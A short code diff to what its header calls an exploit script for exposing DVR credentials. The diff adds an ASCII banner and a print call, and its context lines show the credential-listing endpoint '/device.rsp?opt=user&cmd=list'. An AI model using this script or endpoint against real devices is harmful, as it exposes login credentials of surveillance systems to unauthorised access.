@@ -14,6 +14,21 @@ class Colors:
     BOLD        = '\033[1m'
     BR_COLOUR   = '\033[1;37;40m'
 
+banner = '''
+                             __..--.._
+      .....              .--~  .....  `.
+    .":    "`-..  .    .' ..-'"    :". `
+    ` `._ ` _.'`"(     `-"'`._ ' _.' '
+         ~~~      `.          ~~~
+                  .'
+                 /
+                (
+                 ^---'
+
+
+ [*] @capitan_alfa
+'''
+
 details = ''' 
  # Exploit Title:   DVRs; Credentials Exposed
  # Date:            09/04/2018
@@ -36,6 +51,9 @@ headers = {}
 
 fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
 host        =   "http://"+HST+":"+str(port)+"/"
+
+print Colors.GREEN+banner+Colors.DEFAULT
+
 
 def makeReqHeaders(xCookie):
     headers["Host"]             =  host
